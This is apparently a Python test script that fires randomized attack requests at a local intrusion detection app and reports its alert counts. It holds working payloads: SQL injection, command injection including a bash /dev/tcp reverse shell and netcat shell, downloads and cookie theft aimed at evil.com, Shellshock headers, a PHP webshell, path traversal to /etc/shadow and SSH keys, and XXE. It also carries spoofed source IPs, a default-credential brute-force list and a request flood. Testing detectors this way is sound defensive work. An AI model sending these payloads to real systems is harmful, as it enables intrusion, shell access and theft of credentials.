"""
IDS TEST SCRIPT v3.0
Random mixed attacks | All severities | 2-3s delays
"""
import requests
import time
import random
import sys

BASE_URL = "http://localhost:5000"
TIMEOUT  = 5

total_sent    = 0
total_success = 0
total_failed  = 0

IPS = [
    "185.220.101.5",  "185.220.101.6",  "185.220.101.7",
    "45.33.32.156",   "45.33.32.157",   "45.33.32.158",
    "91.108.4.1",     "91.108.4.2",     "91.108.4.3",
    "203.0.113.1",    "203.0.113.2",    "203.0.113.3",
    "198.51.100.1",   "198.51.100.2",   "198.51.100.3",
    "77.88.8.1",      "77.88.8.2",      "77.88.8.3",
    "62.210.115.87",  "62.210.115.88",  "62.210.115.89",
    "192.168.10.1",   "192.168.10.2",   "192.168.10.3",
    "172.16.0.1",     "172.16.0.2",     "172.16.0.3",
    "10.0.0.1",       "10.0.0.2",       "10.0.0.3",
    "192.168.1.100",  "192.168.1.101",  "192.168.1.102",
    "8.8.4.1",        "8.8.4.2",        "8.8.4.3",
    "91.108.56.100",  "198.20.69.74",   "198.20.69.75",
    "10.10.10.1",     "10.10.10.2",     "172.20.0.1",
]


def send(label, path="/", method="GET", params=None,
         json_data=None, headers=None, ip=None):
    global total_sent, total_success, total_failed

    spoofed = ip or random.choice(IPS)
    url = BASE_URL + path

    base_headers = {
        "X-Forwarded-For": spoofed,
        "X-Real-IP":       spoofed,
    }
    if headers:
        base_headers.update(headers)

    total_sent += 1

    try:
        if method == "GET":
            r = requests.get(url, params=params,
                           headers=base_headers, timeout=TIMEOUT)
        else:
            r = requests.post(url, params=params,
                            json=json_data, headers=base_headers,
                            timeout=TIMEOUT)
        total_success += 1
        print(f"  ✅ [{r.status_code}] {label:<45} IP: {spoofed}")
        return r
    except Exception as e:
        total_failed += 1
        print(f"  ❌ {label} → {e}")
        return None


def delay():
    time.sleep(random.uniform(2, 3))


def build_all_attacks():
    attacks = []

    # ══════════════════════════════════════════════════════
    # 🔴 CRITICAL SEVERITY
    # ══════════════════════════════════════════════════════

    # SQL Injection
    attacks.append(("SQLi OR bypass", "CRITICAL",
        "/", "GET", {"id": "1' OR '1'='1"}, None, None))
    attacks.append(("SQLi UNION SELECT", "CRITICAL",
        "/", "GET", {"id": "1 UNION SELECT username,password FROM users"}, None, None))
    attacks.append(("SQLi DROP TABLE", "CRITICAL",
        "/", "GET", {"input": "1; DROP TABLE users--"}, None, None))
    attacks.append(("SQLi admin bypass", "CRITICAL",
        "/", "GET", {"user": "admin'--"}, None, None))
    attacks.append(("SQLi SLEEP blind", "CRITICAL",
        "/", "GET", {"id": "1 AND SLEEP(5)"}, None, None))
    attacks.append(("SQLi schema extract", "CRITICAL",
        "/", "GET", {"id": "1 UNION SELECT table_name FROM information_schema.tables"}, None, None))
    attacks.append(("SQLi EXEC command", "CRITICAL",
        "/", "GET", {"q": "1; exec xp_cmdshell 'dir'"}, None, None))
    attacks.append(("SQLi CAST extract", "CRITICAL",
        "/", "GET", {"id": "1 AND CAST(username AS int)"}, None, None))
    attacks.append(("SQLi POST form", "CRITICAL",
        "/login", "POST", None, {"username": "admin' OR '1'='1", "password": "x"}, None))
    attacks.append(("SQLi stacked query", "CRITICAL",
        "/", "GET", {"q": "1'; INSERT INTO users VALUES('h','h')--"}, None, None))

    # Command Injection
    attacks.append(("CMD semicolon", "CRITICAL",
        "/", "GET", {"cmd": "ls;whoami"}, None, None))
    attacks.append(("CMD pipe", "CRITICAL",
        "/", "GET", {"input": "test|cat /etc/passwd"}, None, None))
    attacks.append(("CMD backtick", "CRITICAL",
        "/", "GET", {"q": "hello`whoami`"}, None, None))
    attacks.append(("CMD AND operator", "CRITICAL",
        "/", "GET", {"data": "test&&ipconfig"}, None, None))
    attacks.append(("CMD subshell", "CRITICAL",
        "/", "GET", {"input": "$(whoami)"}, None, None))
    attacks.append(("CMD wget download", "CRITICAL",
        "/", "GET", {"exec": "wget http://evil.com/shell.sh"}, None, None))
    attacks.append(("CMD reverse shell", "CRITICAL",
        "/", "GET", {"cmd": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, None, None))
    attacks.append(("CMD netcat", "CRITICAL",
        "/", "GET", {"run": "nc -e /bin/sh 10.0.0.1 4444"}, None, None))
    attacks.append(("CMD chmod", "CRITICAL",
        "/", "GET", {"cmd": ";chmod 777 /etc/passwd"}, None, None))
    attacks.append(("CMD newline inject", "CRITICAL",
        "/", "GET", {"cmd": "dir%0awhoami"}, None, None))

    # Shellshock
    attacks.append(("Shellshock User-Agent", "CRITICAL",
        "/", "GET", None, None, {"User-Agent": "() { :; }; echo shellshock_test"}))
    attacks.append(("Shellshock Referer", "CRITICAL",
        "/", "GET", None, None, {"Referer": "() { :; }; /bin/bash -i"}))
    attacks.append(("Shellshock Cookie", "CRITICAL",
        "/", "GET", None, None, {"Cookie": "() { :; }; wget http://evil.com/s.sh"}))
    attacks.append(("Shellshock Accept", "CRITICAL",
        "/", "GET", None, None, {"Accept": "() { :;}; /usr/bin/python -c 'import os'"}))

    # Malware Signatures
    attacks.append(("Malware meterpreter", "CRITICAL",
        "/", "GET", {"cmd": "meterpreter"}, None, None))
    attacks.append(("Malware powershell enc", "CRITICAL",
        "/", "GET", {"run": "powershell -enc SQBFAFgA"}, None, None))
    attacks.append(("Malware powershell IEX", "CRITICAL",
        "/", "GET", {"exec": "IEX(New-Object Net.WebClient).DownloadString('http://evil.com')"}, None, None))
    attacks.append(("Malware php webshell", "CRITICAL",
        "/", "GET", {"cmd": "<?php system($_GET['cmd']); ?>"}, None, None))
    attacks.append(("Malware base64 eval", "CRITICAL",
        "/", "GET", {"data": "eval(base64_decode('cGhwaW5mbygpOw=='))"}, None, None))
    attacks.append(("Malware cobalt strike", "CRITICAL",
        "/", "GET", {"beacon": "cobalt strike"}, None, None))
    attacks.append(("Malware mimikatz", "CRITICAL",
        "/", "GET", {"tool": "mimikatz"}, None, None))

    # ══════════════════════════════════════════════════════
    # 🟠 HIGH SEVERITY
    # ══════════════════════════════════════════════════════

    # XSS
    attacks.append(("XSS script tag", "HIGH",
        "/", "GET", {"q": "<script>alert(1)</script>"}, None, None))
    attacks.append(("XSS img onerror", "HIGH",
        "/", "GET", {"name": "<img src=x onerror=alert(1)>"}, None, None))
    attacks.append(("XSS svg onload", "HIGH",
        "/", "GET", {"search": "<svg onload=alert(1)>"}, None, None))
    attacks.append(("XSS javascript proto", "HIGH",
        "/", "GET", {"url": "javascript:alert(document.cookie)"}, None, None))
    attacks.append(("XSS body onload", "HIGH",
        "/", "GET", {"input": "<body onload=alert(1)>"}, None, None))
    attacks.append(("XSS iframe inject", "HIGH",
        "/", "GET", {"page": "<iframe src=javascript:alert(1)>"}, None, None))
    attacks.append(("XSS cookie steal", "HIGH",
        "/", "GET", {"q": "<script>document.location='http://evil.com?c='+document.cookie</script>"}, None, None))
    attacks.append(("XSS template inject", "HIGH",
        "/", "GET", {"name": "{{constructor.constructor('alert(1)')()}}"}, None, None))
    attacks.append(("XSS data URI", "HIGH",
        "/", "GET", {"src": "data:text/html,<script>alert(1)</script>"}, None, None))
    attacks.append(("XSS vbscript", "HIGH",
        "/", "GET", {"q": "vbscript:msgbox(1)"}, None, None))

    # Path Traversal
    attacks.append(("Path /etc/passwd", "HIGH",
        "/", "GET", {"file": "../../../etc/passwd"}, None, None))
    attacks.append(("Path windows", "HIGH",
        "/", "GET", {"page": "..\\..\\..\\windows\\system32"}, None, None))
    attacks.append(("Path encoded", "HIGH",
        "/", "GET", {"path": "..%2F..%2F..%2Fetc%2Fshadow"}, None, None))
    attacks.append(("Path ssh keys", "HIGH",
        "/", "GET", {"file": "../../../root/.ssh/id_rsa"}, None, None))
    attacks.append(("Path proc self", "HIGH",
        "/", "GET", {"file": "/proc/self/environ"}, None, None))
    attacks.append(("Path null byte", "HIGH",
        "/", "GET", {"file": "../../../etc/passwd%00.jpg"}, None, None))
    attacks.append(("Path double encode", "HIGH",
        "/", "GET", {"file": "%252e%252e%252fetc%252fpasswd"}, None, None))
    attacks.append(("Path config file", "HIGH",
        "/", "GET", {"path": "../../config.php"}, None, None))
    attacks.append(("Path log file", "HIGH",
        "/", "GET", {"file": "/var/log/auth.log"}, None, None))

    # File Inclusion
    attacks.append(("LFI php filter", "HIGH",
        "/", "GET", {"page": "php://filter/convert.base64-encode/resource=index"}, None, None))
    attacks.append(("RFI remote file", "HIGH",
        "/", "GET", {"file": "http://evil.com/shell.php"}, None, None))
    attacks.append(("LFI php input", "HIGH",
        "/", "GET", {"page": "php://input"}, None, None))
    attacks.append(("RFI ftp file", "HIGH",
        "/", "GET", {"file": "ftp://attacker.com/shell.txt"}, None, None))
    attacks.append(("LFI phar wrapper", "HIGH",
        "/", "GET", {"page": "phar://shell.phar/shell.php"}, None, None))

    # ══════════════════════════════════════════════════════
    # 🟡 MEDIUM SEVERITY
    # ══════════════════════════════════════════════════════

    # Scanner Detection
    attacks.append(("Scanner SQLMap agent", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "sqlmap/1.7.8"}))
    attacks.append(("Scanner Nikto agent", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "Nikto/2.1.6"}))
    attacks.append(("Scanner Nmap agent", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "Nmap Scripting Engine"}))
    attacks.append(("Scanner Burp agent", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "BurpSuite/2023.1"}))
    attacks.append(("Scanner Acunetix agent", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "acunetix-wvs-scanner/10.0"}))
    attacks.append(("Scanner ZAP agent", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "OWASP ZAP/2.12.0"}))
    attacks.append(("Scanner Nessus agent", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "Nessus SOAP"}))
    attacks.append(("Scanner python-requests", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "python-requests/2.28.0"}))
    attacks.append(("Scanner curl agent", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "curl/7.68.0"}))
    attacks.append(("Scanner gobuster", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "gobuster/3.1.0"}))
    attacks.append(("Scanner dirbuster", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "DirBuster-1.0-RC1"}))
    attacks.append(("Scanner wfuzz", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "Wfuzz/2.4"}))
    attacks.append(("Scanner nuclei", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "nuclei"}))
    attacks.append(("Scanner scrapy", "MEDIUM",
        "/", "GET", None, None, {"User-Agent": "Scrapy/2.6.0"}))

    # XML/XXE Injection
    attacks.append(("XXE entity system", "MEDIUM",
        "/", "GET", {"data": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"}, None, None))
    attacks.append(("XXE DOCTYPE", "MEDIUM",
        "/", "GET", {"xml": "<!DOCTYPE foo SYSTEM 'http://evil.com/evil.dtd'>"}, None, None))
    attacks.append(("XXE POST body", "MEDIUM",
        "/", "POST", None, {"xml": "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]>"}, None))

    # LDAP Injection
    attacks.append(("LDAP filter bypass", "MEDIUM",
        "/", "GET", {"user": "*)(uid=*))(|(uid=*"}, None, None))
    attacks.append(("LDAP wildcard", "MEDIUM",
        "/", "GET", {"filter": "(&(objectClass=*)(uid=admin))"}, None, None))
    attacks.append(("LDAP OR bypass", "MEDIUM",
        "/", "GET", {"user": "admin)(|(password=*)"}, None, None))

    # Sensitive Data
    attacks.append(("Sensitive password URL", "MEDIUM",
        "/", "GET", {"password": "SuperSecret123!"}, None, None))
    attacks.append(("Sensitive API key", "MEDIUM",
        "/", "GET", {"api_key": "sk-1234567890abcdefghij"}, None, None))
    attacks.append(("Sensitive credit card", "MEDIUM",
        "/", "GET", {"card": "4111111111111111"}, None, None))
    attacks.append(("Sensitive secret key", "MEDIUM",
        "/", "GET", {"secret_key": "my-super-secret-key-12345678"}, None, None))
    attacks.append(("Sensitive private key", "MEDIUM",
        "/", "GET", {"private_key": "abcdef1234567890abcdef1234567890"}, None, None))

    # ══════════════════════════════════════════════════════
    # 🟢 LOW SEVERITY
    # ══════════════════════════════════════════════════════

    # Suspicious User Agents (triggers UA-001, UA-002, UA-003)
    attacks.append(("LOW: Headless Chrome agent", "LOW",
        "/", "GET", None, None, {"User-Agent": "HeadlessChrome/95.0.4638.69"}))
    attacks.append(("LOW: PhantomJS agent", "LOW",
        "/", "GET", None, None, {"User-Agent": "PhantomJS/2.1.1"}))
    attacks.append(("LOW: Selenium agent", "LOW",
        "/", "GET", None, None, {"User-Agent": "selenium webdriver"}))
    attacks.append(("LOW: Puppeteer agent", "LOW",
        "/", "GET", None, None, {"User-Agent": "puppeteer/13.0.0"}))
    attacks.append(("LOW: Playwright agent", "LOW",
        "/", "GET", None, None, {"User-Agent": "playwright/1.20.0"}))
    attacks.append(("LOW: Hydra brute tool", "LOW",
        "/", "GET", None, None, {"User-Agent": "hydra/9.3"}))
    attacks.append(("LOW: Havij SQL tool", "LOW",
        "/", "GET", None, None, {"User-Agent": "havij/1.17"}))
    attacks.append(("LOW: Netcat tool", "LOW",
        "/", "GET", None, None, {"User-Agent": "netcat/1.10"}))
    attacks.append(("LOW: Medusa brute tool", "LOW",
        "/", "GET", None, None, {"User-Agent": "medusa/2.2"}))
    attacks.append(("LOW: Ncrack tool", "LOW",
        "/", "GET", None, None, {"User-Agent": "ncrack/0.7"}))

    # Info Disclosure (triggers INFO-001, INFO-002, INFO-003, INFO-004)
    attacks.append(("LOW: Debug param true", "LOW",
        "/", "GET", {"debug": "true"}, None, None))
    attacks.append(("LOW: Verbose param", "LOW",
        "/", "GET", {"verbose": "true"}, None, None))
    attacks.append(("LOW: Trace param", "LOW",
        "/", "GET", {"trace": "1"}, None, None))
    attacks.append(("LOW: Stacktrace param", "LOW",
        "/", "GET", {"stacktrace": "true"}, None, None))
    attacks.append(("LOW: Show errors param", "LOW",
        "/", "GET", {"show_errors": "1"}, None, None))
    attacks.append(("LOW: Diagnostic param", "LOW",
        "/", "GET", {"diagnostic": "on"}, None, None))
    attacks.append(("LOW: Git config probe", "LOW",
        "/.git/config", "GET", None, None, None))
    attacks.append(("LOW: SVN entries probe", "LOW",
        "/.svn/entries", "GET", None, None, None))
    attacks.append(("LOW: DS_Store probe", "LOW",
        "/.DS_Store", "GET", None, None, None))
    attacks.append(("LOW: Env file probe", "LOW",
        "/.env", "GET", None, None, None))
    attacks.append(("LOW: Env local probe", "LOW",
        "/.env.local", "GET", None, None, None))
    attacks.append(("LOW: Env prod probe", "LOW",
        "/.env.production", "GET", None, None, None))
    attacks.append(("LOW: Config yaml probe", "LOW",
        "/config.yaml", "GET", None, None, None))
    attacks.append(("LOW: Secrets yml probe", "LOW",
        "/secrets.yml", "GET", None, None, None))
    attacks.append(("LOW: Backup bak file", "LOW",
        "/database.bak", "GET", None, None, None))
    attacks.append(("LOW: Backup sql file", "LOW",
        "/backup.sql", "GET", None, None, None))
    attacks.append(("LOW: Old config file", "LOW",
        "/config.php.old", "GET", None, None, None))
    attacks.append(("LOW: Swap file probe", "LOW",
        "/index.php.swp", "GET", None, None, None))
    attacks.append(("LOW: Temp file probe", "LOW",
        "/settings.py.tmp", "GET", None, None, None))
    attacks.append(("LOW: Tilde backup", "LOW",
        "/web.config~", "GET", None, None, None))

    # HTTP Anomalies (triggers HTTP-001, HTTP-002, HTTP-003, HTTP-004)
    attacks.append(("LOW: CRLF injection", "LOW",
        "/", "GET", {"input": "%0d%0aContent-Type:text/html"}, None, None))
    attacks.append(("LOW: CRLF set-cookie", "LOW",
        "/", "GET", {"data": "%0d%0aSet-Cookie:hacked=true"}, None, None))
    attacks.append(("LOW: CRLF location", "LOW",
        "/", "GET", {"q": "%0d%0aLocation:http://evil.com"}, None, None))
    attacks.append(("LOW: Mass assign admin", "LOW",
        "/", "GET", {"is_admin": "true", "role": "admin"}, None, None))
    attacks.append(("LOW: Mass assign role", "LOW",
        "/", "GET", {"permission": "superuser", "admin": "1"}, None, None))
    attacks.append(("LOW: Mass assign root", "LOW",
        "/", "GET", {"privilege": "root", "role": "admin"}, None, None))
    attacks.append(("LOW: Prototype pollution", "LOW",
        "/", "GET", {"__proto__[admin]": "true"}, None, None))
    attacks.append(("LOW: Prototype construct", "LOW",
        "/", "GET", {"constructor.prototype.admin": "1"}, None, None))
    attacks.append(("LOW: Object prototype", "LOW",
        "/", "GET", {"Object.prototype.isAdmin": "true"}, None, None))

    return attacks


def run_brute_force():
    print(f"\n{'═' * 60}")
    print(f"  🔓 BRUTE FORCE SIMULATION")
    print(f"{'═' * 60}")

    bf_ip = "203.0.113.100"
    creds = [
        ("admin", "password"),  ("admin", "123456"),
        ("admin", "admin"),     ("root", "password"),
        ("root", "toor"),       ("test", "test"),
        ("admin", "letmein"),   ("user", "password"),
    ]

    for i, (u, p) in enumerate(creds):
        send(f"Brute #{i+1} ({u}:{p})",
             path="/login", method="POST",
             json_data={"username": u, "password": p},
             ip=bf_ip)
        time.sleep(0.3)


def run_ddos():
    print(f"\n{'═' * 60}")
    print(f"  🌊 DDOS FLOOD SIMULATION")
    print(f"{'═' * 60}")

    ddos_ip = "185.220.101.100"
    print(f"  Sending 110 requests from {ddos_ip}...\n")

    for i in range(1, 111):
        try:
            requests.get(BASE_URL + "/",
                        headers={"X-Forwarded-For": ddos_ip,
                                "X-Real-IP": ddos_ip},
                        timeout=2)
            if i % 25 == 0:
                print(f"  📤 Sent {i}/110...")
        except Exception:
            pass

    print(f"  ✅ DDoS done!")


def main():
    print("\n" + "═" * 60)
    print("  🛡️  IDS TEST v3.0 — ALL SEVERITIES")
    print("  Random order | 2-3s delays | Low+Med+High+Crit")
    print("═" * 60)

    # Check server
    print("\n  🔍 Checking server...")
    try:
        r = requests.get(BASE_URL, timeout=5)
        print(f"  ✅ Server running ({r.status_code})")
    except Exception:
        print(f"  ❌ Cannot connect — run python app.py first!")
        return

    # Baseline
    try:
        r = requests.get(f"{BASE_URL}/api/alerts/stats", timeout=5)
        baseline = r.json().get('total', 0)
    except Exception:
        baseline = 0

    print(f"  📊 Current alerts: {baseline}")

    # Build and shuffle
    all_attacks = build_all_attacks()
    random.shuffle(all_attacks)

    # Count by severity
    sev_counts = {}
    for a in all_attacks:
        s = a[1]
        sev_counts[s] = sev_counts.get(s, 0) + 1

    print(f"\n  📋 Attack plan:")
    print(f"     🔴 CRITICAL : {sev_counts.get('CRITICAL', 0)}")
    print(f"     🟠 HIGH     : {sev_counts.get('HIGH', 0)}")
    print(f"     🟡 MEDIUM   : {sev_counts.get('MEDIUM', 0)}")
    print(f"     🟢 LOW      : {sev_counts.get('LOW', 0)}")
    print(f"     📊 TOTAL    : {len(all_attacks)}")

    print(f"\n  Starting in 3 seconds...\n")
    time.sleep(3)

    print(f"{'═' * 60}")
    print(f"  🎲 RANDOM MIXED ATTACKS")
    print(f"{'═' * 60}\n")

    for i, attack in enumerate(all_attacks):
        label     = attack[0]
        severity  = attack[1]
        path      = attack[2]
        method    = attack[3]
        params    = attack[4]
        json_data = attack[5]
        headers   = attack[6]

        icon = {"CRITICAL": "🔴", "HIGH": "🟠",
                "MEDIUM": "🟡", "LOW": "🟢"}.get(severity, "⚪")

        print(f"\n  {icon} [{i+1}/{len(all_attacks)}] {severity}")

        send(label, path=path, method=method,
             params=params, json_data=json_data,
             headers=headers)

        delay()

    # Brute force
    delay()
    run_brute_force()

    # DDoS
    delay()
    run_ddos()

    # Summary
    time.sleep(2)
    try:
        r = requests.get(f"{BASE_URL}/api/alerts/stats", timeout=5)
        stats = r.json()
        final = stats.get('total', 0)
        sev   = stats.get('by_severity', {})
        types = stats.get('by_type', {})
    except Exception:
        final = 0
        sev   = {}
        types = {}

    print("\n\n" + "═" * 60)
    print("  📊 FINAL RESULTS")
    print("═" * 60)
    print(f"  Requests Sent      : {total_sent}")
    print(f"  Successful         : {total_success}")
    print(f"  Failed             : {total_failed}")
    print(f"  New Alerts         : {final - baseline}")
    print(f"{'═' * 60}")
    print(f"  🔴 Critical : {sev.get('critical', 0)}")
    print(f"  🟠 High     : {sev.get('high', 0)}")
    print(f"  🟡 Medium   : {sev.get('medium', 0)}")
    print(f"  🟢 Low      : {sev.get('low', 0)}")
    print(f"{'═' * 60}")

    if types:
        print(f"\n  📋 Alert Types:")
        for t, c in sorted(types.items(),
                          key=lambda x: x[1], reverse=True):
            print(f"    → {t:<25} : {c}")

    print(f"\n{'═' * 60}")
    print(f"  🎯 Dashboard : {BASE_URL}")
    print(f"  🚨 Alerts    : {BASE_URL}/alerts")
    print(f"{'═' * 60}\n")


if __name__ == "__main__":
    main()